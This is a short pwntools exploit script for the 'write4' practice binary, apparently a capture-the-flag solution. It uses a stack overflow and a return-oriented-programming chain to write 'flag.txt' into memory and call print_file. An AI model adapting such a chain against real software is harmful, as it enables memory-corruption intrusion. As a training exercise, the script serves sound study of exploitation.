from pwn import*
p=process('./write4')
elf=ELF('./write4')

print_file=0x400510

pop_rdi=0x400693
mov_prtr14_r15=0x400628
pop_r14_r15=0x400690
data=0x601035

payload=b'a'*40+p64(pop_r14_r15)+p64(data)+b'flag.txt'+p64(mov_prtr14_r15)+p64(pop_rdi)+p64(data)+p64(print_file)
p.sendline(payload)
p.interactive()